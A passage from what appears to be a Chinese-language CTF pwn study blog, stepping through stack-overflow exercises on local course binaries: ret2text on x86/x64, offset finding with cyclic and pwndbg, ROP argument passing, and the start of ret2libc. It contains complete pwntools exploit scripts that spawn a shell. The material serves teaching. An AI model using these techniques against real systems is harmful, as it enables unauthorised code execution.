class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本地建立socat</span><br><span class="line">socat TCP-LISTEN:8877,fork exec:./question_1_plus_x64,reuseaddr</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    s.connect((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8877</span>))</span><br><span class="line">    payload = <span class="string">b&#x27;P&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x10&#x27;</span> <span class="comment"># ATTENTION BYTE</span></span><br><span class="line">    s.sendall(payload + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    conn = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8877</span>)</span><br><span class="line">    conn.sock = s</span><br><span class="line">    conn.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__  == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure><hr><h4 id="ret2X-例题"><a href="#ret2X-例题" class="headerlink" title="ret2X 例题"></a>ret2X 例题</h4><h6 id="基本-ret2text-x86"><a href="#基本-ret2text-x86" class="headerlink" title="基本 ret2text x86"></a>基本 ret2text x86</h6><p>ret2text就是执行程序中已有的代码，例如程序中写有system等系统的调用函数, <strong>通过溢出覆盖返回地址执行</strong><br>IDA打开文件 ，找到函数内栈空间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-00000010 buf             dd ?</span><br><span class="line">-0000000C var_C           dd ?</span><br><span class="line">-00000008                 db ? ; undefined</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br></pre></td></tr></table></figure><p>判断buf 到 r(栈底指针) 处偏移为0x14 &#x3D; 20byte，r往下四字节就是给ret的栈空间，可以利用溢出来赋值r<br><strong>覆盖 <code>r</code> 本身需要额外的 4 字节</strong><br>20byte + 4byte &#x3D; 24byte</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27; * 20 + b&#x27;&amp;func&#x27;</span><br></pre></td></tr></table></figure><p>pwntools 脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"><span class="comment"># checksec FILENAME</span></span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_1_x86&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, )</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x14</span></span><br><span class="line"><span class="comment"># padding = padding2ebp + context.word_size//8   </span></span><br><span class="line"><span class="comment">#通过调试得到</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># ni finish finish 到调用的函数内, ni....ni</span></span><br><span class="line"></span><br><span class="line">return_addr = <span class="number">0x08049182</span></span><br><span class="line"><span class="comment"># sh_addr = 0x0804c03e </span></span><br><span class="line">payload = flat([cyclic(padding), return_addr])</span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><ul><li>先ni，然后在pwntool shell中回车代表开始</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────</span><br><span class="line"> ► 0 0xe9b2c579 __kernel_vsyscall+9</span><br><span class="line">   1 0xe99ed9d7 read+55</span><br><span class="line">   2 0x80491f6 dofunc+69   &lt;- 这是我们要到达的地方</span><br><span class="line">   3 0x8049182 func</span><br><span class="line">   4      0xa None</span><br></pre></td></tr></table></figure><ul><li>gdb中finish（可以看右下角的 BACKTRACE）到main中的被调用的那个函数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────</span><br><span class="line"> ► 0 0x80491f6 dofunc+69</span><br><span class="line">   1 0x8049182 func</span><br><span class="line">   2      0xa None</span><br></pre></td></tr></table></figure><ul><li>然后可以用 <code>stack 20</code> 查看栈覆盖和溢出情况</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">06:0018│ ecx 0xfff272c8 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">07:001c│-00c 0xfff272cc ◂— 0x61616162 (&#x27;baaa&#x27;)</span><br><span class="line">08:0020│-008 0xfff272d0 ◂— 0x61616163 (&#x27;caaa&#x27;)</span><br><span class="line">09:0024│-004 0xfff272d4 ◂— 0x61616164 (&#x27;daaa&#x27;)</span><br><span class="line">0a:0028│ ebp 0xfff272d8 ◂— 0x61616165 (&#x27;eaaa&#x27;)</span><br><span class="line">0b:002c│+004 0xfff272dc —▸ 0x8049182 (func) ◂— push ebp</span><br></pre></td></tr></table></figure><ul><li>一直ni &#x2F; c就可以拿到shell</li></ul><h6 id="esp寻址的-ret2text-x86"><a href="#esp寻址的-ret2text-x86" class="headerlink" title="esp寻址的 ret2text x86"></a>esp寻址的 ret2text x86</h6><p>和基本题型差不多，只是ret位置在IDA中显示错误而已<br>在输入函数前提前准备好cyclic</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic 50</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span><br></pre></td></tr></table></figure><ul><li>stack 30<br>可以看到</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ esp 0xffffd160 ◂— 0</span><br><span class="line">01:0004│-034 0xffffd164 —▸ 0xffffd178 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">02:0008│-030 0xffffd168 ◂— 0x100</span><br><span class="line">03:000c│-02c 0xffffd16c —▸ 0x80491b7 (dofunc+9) ◂— add ebx, 0x2e49</span><br><span class="line">04:0010│-028 0xffffd170 ◂— 0xffffffff</span><br><span class="line">05:0014│-024 0xffffd174 —▸ 0xf7d8396c ◂— 0x914</span><br><span class="line">06:0018│ ecx 0xffffd178 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">07:001c│-01c 0xffffd17c ◂— 0x61616162 (&#x27;baaa&#x27;)</span><br><span class="line">08:0020│-018 0xffffd180 ◂— 0x61616163 (&#x27;caaa&#x27;)</span><br><span class="line">09:0024│-014 0xffffd184 ◂— 0x61616164 (&#x27;daaa&#x27;)</span><br><span class="line">0a:0028│-010 0xffffd188 ◂— 0x61616165 (&#x27;eaaa&#x27;)</span><br><span class="line">0b:002c│-00c 0xffffd18c ◂— 0x61616166 (&#x27;faaa&#x27;)</span><br><span class="line">0c:0030│-008 0xffffd190 ◂— 0x61616167 (&#x27;gaaa&#x27;)</span><br><span class="line">0d:0034│-004 0xffffd194 ◂— 0x61616168 (&#x27;haaa&#x27;)</span><br><span class="line">0e:0038│ ebp 0xffffd198 ◂— 0x61616169 (&#x27;iaaa&#x27;)</span><br><span class="line">0f:003c│+004 0xffffd19c ◂— 0x6161616a (&#x27;jaaa&#x27;)</span><br><span class="line">10:0040│+008 0xffffd1a0 ◂— 0x6161616b (&#x27;kaaa&#x27;)</span><br><span class="line">11:0044│+00c 0xffffd1a4 ◂— 0x6161616c (&#x27;laaa&#x27;)</span><br></pre></td></tr></table></figure><p>可以看到ebp处为32byte，（其实是错误的，因为是esp寻址）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l iaaa</span><br><span class="line">Finding cyclic pattern of 4 bytes: b&#x27;iaaa&#x27; (hex: 0x69616161)</span><br><span class="line">Found at offset 32</span><br></pre></td></tr></table></figure><p>继续运行到ret：<br>可以看到esp处为 ‘faaa’, 断定栈空间到ret处为20byte, 后可溢出<br><code>20byte + 4byte</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffd18c ◂— 0x61616166 (&#x27;faaa&#x27;)</span><br><span class="line">01:0004│-008 0xffffd190 ◂— 0x61616167 (&#x27;gaaa&#x27;)</span><br><span class="line">02:0008│-004 0xffffd194 ◂— 0x61616168 (&#x27;haaa&#x27;)</span><br><span class="line">03:000c│ ebp 0xffffd198 ◂— 0x61616169 (&#x27;iaaa&#x27;)</span><br><span class="line">04:0010│+004 0xffffd19c ◂— 0x6161616a (&#x27;jaaa&#x27;)</span><br><span class="line">05:0014│+008 0xffffd1a0 ◂— 0x6161616b (&#x27;kaaa&#x27;)</span><br><span class="line">06:0018│+00c 0xffffd1a4 ◂— 0x6161616c (&#x27;laaa&#x27;)</span><br><span class="line">07:001c│+010 0xffffd1a8 ◂— 0xff0a616d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; cyclic -l faaa</span><br><span class="line">Finding cyclic pattern of 4 bytes: b&#x27;faaa&#x27; (hex: 0x66616161)</span><br><span class="line">Found at offset 20</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_1_x86_sep&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, )</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x14</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">return_addr = <span class="number">0x08049182</span></span><br><span class="line">payload = flat([cyclic(padding), return_addr])</span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="基本ret2text-x64程序"><a href="#基本ret2text-x64程序" class="headerlink" title="基本ret2text x64程序"></a>基本ret2text x64程序</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec question_4_1_x64</span><br><span class="line">[*] &#x27;/mnt/hgfs/CTF/Pwn_Study/pwn_exercise/section_2/第二章课件/chapter_2/test_6/question_4_1_x64&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>还是一样找溢出的地方</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ rsp 0x7fffffffdfd0 ◂— 0</span><br><span class="line">01:0008│ rsi 0x7fffffffdfd8 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">02:0010│ rbp 0x7fffffffdfe0 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">03:0018│+008 0x7fffffffdfe8 ◂— 0x6262626262626262 (&#x27;bbbbbbbb&#x27;)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到 <code>03:0018│+008 0x7fffffffdfe8 ◂— 0x6262626262626262 (&#39;bbbbbbbb&#39;)</code> 就已经溢出了， <code>(e8 - e0)</code> 溢出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────</span><br><span class="line"> ► 0         0x401193 dofunc+50</span><br><span class="line">   1 0x6262626262626262 None</span><br><span class="line">   2   0x7fffffffe00a None</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_1_x64&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, )</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">return_addr = <span class="number">0x401142</span></span><br><span class="line">payload = flat([cyclic(padding), return_addr])</span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7fff11b9a6a0 ◂— 0</span><br><span class="line">01:0008│ rsi 0x7fff11b9a6a8 ◂— 0x6161616261616161 (&#x27;aaaabaaa&#x27;)</span><br><span class="line">02:0010│ rbp 0x7fff11b9a6b0 ◂— 0x6161616461616163 (&#x27;caaadaaa&#x27;)</span><br><span class="line">03:0018│+008 0x7fff11b9a6b8 —▸ 0x401142 (func) ◂— push rbp</span><br><span class="line">04:0020│+010 0x7fff11b9a6c0 —▸ 0x7fff11b9a70a ◂— 0</span><br><span class="line">05:0028│+018 0x7fff11b9a6c8 —▸ 0x790f4362a1ca (__libc_start_call_main+122) ◂— mov edi, eax</span><br><span class="line">06:0030│+020 0x7fff11b9a6d0 —▸ 0x7fff11b9a710 ◂— 0</span><br><span class="line">07:0038│+028 0x7fff11b9a6d8 —▸ 0x7fff11b9a7e8 —▸ 0x7fff11b9c4eb ◂— &#x27;./question_4_1_x64&#x27;</span><br><span class="line">─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────</span><br><span class="line"> ► 0         0x401193 dofunc+50</span><br><span class="line">   1         0x401142 func</span><br><span class="line">   2   0x7fff11b9a70a None</span><br></pre></td></tr></table></figure><p>可以看到已经成功溢出了</p><h6 id="ret2text-传参-x86"><a href="#ret2text-传参-x86" class="headerlink" title="ret2text 传参 x86"></a>ret2text 传参 x86</h6><ul><li>需要了解一个知识，ret后跟的是要调用函数的地址(&amp;func) , 随后+4栈内存跟的是被调用函数中(如果有)的参数<br>我们需要构造成：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 20</span><br><span class="line">00:0000│ esp 0xffffcdb0 ◂— 0                                                     ESP</span><br><span class="line">01:0004│-024 0xffffcdb4 —▸ 0xffffcdc8 ◂— &#x27;aaaabbbb\n&#x27;</span><br><span class="line">02:0008│-020 0xffffcdb8 ◂— 0x100</span><br><span class="line">03:000c│-01c 0xffffcdbc —▸ 0x80491b9 (dofunc+12) ◂— add ebx, 0x2e47</span><br><span class="line">04:0010│-018 0xffffcdc0 ◂— 0xffffffff</span><br><span class="line">05:0014│-014 0xffffcdc4 —▸ 0xf7d8396c ◂— 0x914</span><br><span class="line">06:0018│ ecx 0xffffcdc8 ◂— &#x27;aaaabbbb\n&#x27;                                           aaaa</span><br><span class="line">07:001c│-00c 0xffffcdcc ◂— &#x27;bbbb\n&#x27;                                               bbbb</span><br><span class="line">08:0020│-008 0xffffcdd0 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">09:0024│-004 0xffffcdd4 —▸ 0xf7fa2e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* &#x27;,\r#&#x27; */</span><br><span class="line">0a:0028│ ebp 0xffffcdd8 —▸ 0xffffcde8 ◂— 0</span><br><span class="line">0b:002c│+004 0xffffcddc —▸ 0x8049214 (main+21) ◂— mov eax, 0                      ret后的调用地址 (&amp;func)</span><br><span class="line">0c:0030│+008 0xffffcde0 ◂— 0                                                      执行完func后的返回地址 (很重要！)</span><br><span class="line">... ↓  2 skipped                                                        (如果有,可能)被调用的参数 (search &quot;/bin/sh&quot;)  </span><br><span class="line">                                                                       (如果有,可能)被调用的第二个参数</span><br><span class="line">                                                                                 ......</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">07:001c│-00c 0xffffcdcc ◂— &#x27;aaaa\n&#x27;                                                            </span><br><span class="line">08:0020│-008 0xffffcdd0 ◂— 0xa /* &#x27;\n&#x27; */                                                      </span><br><span class="line">09:0024│-004 0xffffcdd4 —▸ 0xf7fa2e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* &#x27;,\r#&#x27; */</span><br><span class="line">0a:0028│ ebp 0xffffcdd8 —▸ 0xffffcde8 ◂— 0                                                     </span><br><span class="line">0b:002c│+004 0xffffcddc —▸ 0x8049182 (func) ◂— push ebp            (&amp;func)                            </span><br><span class="line">0c:0030│+008 0xffffcde0 ◂— 0xdeadbeef                              (随便一个return值)                            </span><br><span class="line">0d:0034│+00c 0xffffcde4 —▸ 0x804c024 (sh) ◂— &#x27;/bin/sh&#x27;             (search &quot;/bin/sh&quot; 的内存地址)</span><br></pre></td></tr></table></figure><p>要用脚本完成就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_2_x86_new&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, )</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x14</span>  <span class="comment">#20个&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;func&#x27;</span>]  <span class="comment">#取func的地址</span></span><br><span class="line">bin_sh_addr = <span class="number">0x804c018</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p32(return_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh_addr) </span><br><span class="line"><span class="comment"># payload = flat([cyclic(padding),return_addr])</span></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h6 id="ret2text-传参-x64"><a href="#ret2text-传参-x64" class="headerlink" title="ret2text 传参 x64"></a>ret2text 传参 x64</h6><p>x86-64架构寄存器， 传参过程会调用 <code>rdi, rsi, rdc, rcx, r8, r9....</code> 等寄存器，分别为第一个参数，第二个参数…..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RDI  0x404040 (sh) ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */    (设置RDI寄存器为/bin/sh的内存地址)</span><br><span class="line"></span><br><span class="line"> ► 0x401155 &lt;func+19&gt;     call   system@plt                  &lt;system@plt&gt;</span><br><span class="line">        command: 0x404040 (sh) ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */                  (可以看到已经成功传参了)</span><br></pre></td></tr></table></figure><p><strong>如果要用pwn脚本打，需要理解一些东西：</strong><br>ROP (Return-Oriented Programming) :</p><ul><li>通过组合程序中已有的代码片段（<code>gadgets</code>）来构造恶意逻辑</li><li>每个 <code>gadget</code> 通常以 <code>ret</code> 指令结尾，用于链接多个片段形成攻击链</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary question_4_2_x64_new </span><br></pre></td></tr></table></figure><p><strong>之前是通过dbg中的set命令设置的，但是在脚本中，我们要用ROP来构造，所以要改为:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 栈溢出</span><br><span class="line">2 pop rdi; ret  (赋值/bin/sh 给 rdi寄存器)</span><br><span class="line">3 bin_sh_addr </span><br><span class="line">4 func_address  (此时rdi已经被赋值为了/bin/sh的内存地址，直接调用func函数，rdi会被当作第一个参数传入func函数, getshell)</span><br></pre></td></tr></table></figure><p>找 <code>pop rdi; ret</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040120b : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>编写脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_2_x64&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, )</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;func&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x40120b</span></span><br><span class="line">bin_sh_addr = <span class="number">0x404040</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(return_addr)</span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="ret2libc-x64"><a href="#ret2libc-x64" class="headerlink" title="ret2libc x64"></a>ret2libc x64</h6><p>在程序内没有system函数的时候 ， 只能通过去libc共享库连接文件中去调用 ，怎么知道system的地址呢？<br><strong>泄露程序中已经有调用的函数地址 ， 通过 <code>真实地址 = 基地址 + 偏移地址</code> 的方式计算出system , binsh的地址 ， 